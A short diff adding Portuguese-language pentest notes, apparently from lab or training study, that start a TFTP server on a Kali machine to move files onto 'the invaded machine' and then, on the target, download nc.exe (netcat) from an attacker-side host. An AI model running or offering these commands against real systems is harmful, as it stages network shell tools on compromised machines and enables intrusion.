@@ -1,0 +1,10 @@
+---------------------------------------------
+==== criar um servidor tftp para trasnferir arquivos para a máquina invadida
+
+root@kali:/tmp# atftpd --daemon --port 69 /tmp
+
+
+
+=== na máquina alvo:
+
+tftp -i 10.21.0.103 GET nc.exe  (baixa o arquivo nc.exe)
